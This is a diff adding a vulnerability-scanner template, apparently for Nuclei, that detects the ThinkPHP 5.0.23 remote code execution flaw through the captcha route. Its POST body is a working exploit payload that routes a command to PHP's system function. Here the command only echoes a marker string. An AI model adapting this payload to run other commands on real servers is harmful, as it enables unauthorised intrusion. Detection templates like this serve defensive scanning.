@@ -1,0 +1,23 @@
+id: thinkphp-5023-rce
+
+info:
+  name: ThinkPHP 5.0.23 Remote Code Execution
+  author: generated
+  severity: critical
+  description: ThinkPHP 5.0.23 versions have a remote code execution vulnerability via the captcha parameter.
+  reference:
+    - https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce
+  tags: thinkphp,rce
+
+requests:
+  - method: POST
+    path:
+      - "/index.php?s=captcha"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "_method=__construct&filter%5B%5D=system&method=get&server%5BREQUEST_METHOD%5D=echo+%27ThinkPHP_RCE_Vulnerable%27"
+    matchers:
+      - type: word
+        words:
+          - "ThinkPHP_RCE_Vulnerable"
+        part: body
